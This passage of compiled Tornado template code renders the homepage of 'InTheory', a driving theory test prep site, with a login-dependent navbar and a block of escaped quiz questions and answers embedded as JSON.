  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
